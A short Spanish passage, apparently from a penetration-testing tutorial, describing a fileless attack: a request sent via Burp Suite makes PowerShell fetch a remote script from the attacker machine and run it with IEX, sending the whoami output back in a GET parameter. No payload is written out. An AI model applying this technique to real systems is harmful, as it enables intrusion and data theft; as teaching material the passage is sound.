> \[Nota] Asegúrese de colocar la dirección IP de la máquina atacante en la solicitud anterior.

Envíe la solicitud anterior desde Burp Suite:

> Podemos ver el resultado del comando **whoami** que se transmite en el parámetro HTTP GET.

> Esto se debe a que PowerShell recuperó el recurso remoto y, a continuación, lo ejecutó inmediatamente mediante el comando IEX. ¡Tenga en cuenta que ni siquiera hemos tocado el sistema de archivos!

\
\
